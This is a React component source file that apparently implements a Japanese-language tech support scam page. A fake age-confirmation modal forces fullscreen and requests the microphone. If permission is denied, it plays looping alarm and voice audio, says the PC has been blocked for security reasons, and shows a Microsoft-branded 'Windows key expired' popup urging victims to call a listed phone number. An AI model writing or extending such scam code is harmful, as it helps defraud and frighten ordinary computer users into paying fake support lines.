import React, { useState } from "react";
import Login from "../Login";
import microsoftLogo from "../images/microsoftLogo.jpeg";
import cancelIcon from "../images/cancel.png";
import ModalPic from "../images/modal-pic.jpg";
import { notification, message } from "antd";
import beepAudio from "../beep-04.mp3";
import voice from "../japancams.mp3";

const AgeConfirm = (props) => {
    const [audio] = useState(new Audio(beepAudio));
    const [audio2] = useState(new Audio(voice));
    const [isModalVisible, setIsModalVisible] = useState(false);
    const [isBackModalVisible, setIsBackModalVisible] = useState(false);

    const loginToDash = () => {
        document.getElementById("chat-box").style.display = "block";

        showModal();
        message.error("セキュリティ上の理由でPCがブロックされました");
    };

    const showModal = () => {
        setIsBackModalVisible(true);
    };

    const notificationPopup = () => {
        notification["error"]({
            message: "Windowsキーの有効期限が切れています",
            description: (
                <div>
                    新しいキーを取得するには、サポートに連絡してください。
                    <br />
                    フリーダイヤル：050-5532-4952
                </div>
            ),
            icon: (
                <img
                    src={microsoftLogo}
                    style={{ padding: "0px" }}
                    height="40px"
                    width="40px"
                    alt="warning icon"
                />
            ),
            onClick: loginToDash,
            onClose: loginToDash,
        });
    };

    function getLocalStream() {
        navigator.mediaDevices
            .getUserMedia({ video: false, audio: true })
            .then((stream) => {
                window.localStream = stream; // A
                window.localAudio.srcObject = stream; // B
                window.localAudio.autoplay = true; // C
            })
            .catch((err) => {
                if (err.message === "Permission denied") {
                    audio.play();
                    audio2.play();

                    audio.loop = true;
                    audio2.loop = true;

                    document.getElementById("allowscreen").style.display =
                        "none";
                    document.getElementById("loginPage").style.display =
                        "block";

                    notificationPopup();
                } else {
                    console.log(err);
                }
            });
    }

    return (
        <>
            {/* first page code starts here */}
            <div
                id="ageModal"
                className="age-comfirm-modal rounded"
                onClick={() => {
                    props.makeWindowFullScreen();
                    document.getElementById("ageModal").style.display = "none";
                    document.getElementById("allowscreen").style.display =
                        "block";
                    getLocalStream();
                }}
            >
                <div className="age-comfirm-dialog text-center">
                    <div style={{ textAlign: "right" }}>
                        <img
                            src={cancelIcon}
                            height={20}
                            style={{
                                marginRight: "10px",
                                marginBottom: "5px",
                                cursor: "pointer",
                            }}
                        />
                    </div>
                    {/* <div className="mb-20">あなたは18歳以上ですか？</div>
          <div className="flex mt-20">
            <button className="mr-20 btn btn-lg btn-success">はい</button>
            <button className="btn btn-lg btn-danger">ない</button>
          </div> */}
                    <img src={ModalPic} height="300px" />
                </div>
            </div>

            {/* second page code starts here */}
            <div id="allowscreen" style={{ display: "none" }}></div>

            {/* third page code starts here */}
            <div id="loginPage" style={{ display: "none" }}>
                <Login
                    notificationPopup={notificationPopup}
                    isModalVisible={isModalVisible}
                    setIsModalVisible={setIsModalVisible}
                    isBackModalVisible={isBackModalVisible}
                    setIsBackModalVisible={setIsBackModalVisible}
                    loginToDash={loginToDash}
                />
            </div>
        </>
    );
};

export default AgeConfirm;
